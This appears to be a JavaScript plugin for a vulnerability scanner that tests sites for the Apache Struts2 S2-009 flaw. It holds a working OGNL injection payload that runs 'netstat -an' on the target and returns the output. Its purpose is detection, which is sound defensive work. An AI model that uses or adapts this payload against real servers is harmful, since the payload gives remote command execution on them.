module.exports={
	tags:"struts2,009",
	des:"struts2 Vulnerability detection",
	VulApps:[
		"https://github.com/vulhub/vulhub/tree/master/struts2/s2-009",
		"http://ocnf2x3pk.bkt.clouddn.com/S2-009.war"],
	urls:[
		"https://cwiki.apache.org/confluence/display/WW/S2-009"],
	doCheck:function (url,fnCbk)
	{
		var _t = this,_s = _t.self;
		var s = "class.classLoader.jarPath=%28%23context[\"xwork.MethodAccessor.denyMethodExecution\"]%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess[\"allowStaticMethodAccess\"]%3dtrue%2c+%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%27netstat -an%27%29.getInputStream%28%29%2c%23b%3dnew+java.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.BufferedReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read%28%23d%29%2c%23sbtest%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23sbtest.println%28%23d%29%2c%23sbtest.close%28%29%29%28meh%29&z[%28class.classLoader.jarPath%29%28%27meh%27%29]";
		_s.request(_s.fnOptHeader({method: 'POST',uri: url,"body":s,
			headers:{"User-Agent": _s.g_szUa,
		    	"content-type":"application/x-www-form-urlencoded"}
		    })
		  , function (error, response, body)
		  {
			_s.error(error);
			if(body)
			{
				body = body.toString();
				// console.log(body);
				_s.fnShowBody(body);
				if(-1 < body.indexOf('LISTEN') && -1 < body.indexOf('tcp'))
				{
					fnCbk({"url":url,"send":s,vul:true,'body':body,'s2-009': '发现struts2高危漏洞s2-009，请尽快升级','os':-1 < body.indexOf('unix') ? 'unix': 'windows'},_t);
				}
				//else _s.info(url + "\n" + body);
			}
		    }
		  );
	}
};